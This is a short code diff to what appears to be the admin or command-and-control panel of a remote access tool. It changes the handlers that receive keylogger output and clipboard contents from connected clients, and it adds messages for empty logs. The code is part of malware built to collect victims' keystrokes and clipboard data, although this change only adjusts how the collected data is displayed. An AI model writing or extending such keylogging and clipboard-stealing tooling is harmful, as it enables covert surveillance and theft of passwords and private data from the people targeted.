@@ -74,15 +74,21 @@ public class ConsumeController {
     }
 
     private static void getKeylogger(JSON input, Admin admin) {
-        console.error(input.get("keylogger"));
         String[] logs = input.get("keylogger").split(KEYLOGGER_SPLITTER);
+        console.log(logs.length+"");
+        if (logs.length == 1 && logs[0].isEmpty()) {
+            Admin.getGui().appendLog("[Keylog] Keylog empty");
+            return;
+        }
+
         for(String log : logs) {
             Admin.getGui().appendLog("[Keylog] " + log);
         }
     }
 
     private static void getClipboard(JSON input, Admin admin) {
-        Admin.getGui().appendLog("[Clipboard] " + input.get("clipboard"));
+        String clipboard = input.get("clipboard");
+        Admin.getGui().appendLog("[Clipboard] " + (clipboard.length() == 0 ? "Clipboard empty" : clipboard));
     }
 
     private static void getAllClients(JSON input, Admin admin) {
